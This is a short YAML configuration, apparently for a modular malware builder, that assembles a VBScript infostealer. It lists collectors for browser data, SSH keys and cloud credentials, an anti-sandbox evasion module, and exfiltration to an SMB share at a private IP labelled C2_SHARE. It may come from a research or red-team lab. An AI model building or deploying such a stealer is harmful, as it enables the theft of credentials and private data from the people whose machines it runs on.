name: vbs_infostealer_smb
description: VBScript infostealer with SMB share exfil
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds

exfil: exfil/smb_write
arch: arch/sequential

evasion:
  - evasion/anti_sandbox

vars:
  C2_SHARE: "\\\\10.0.2.2\\share"
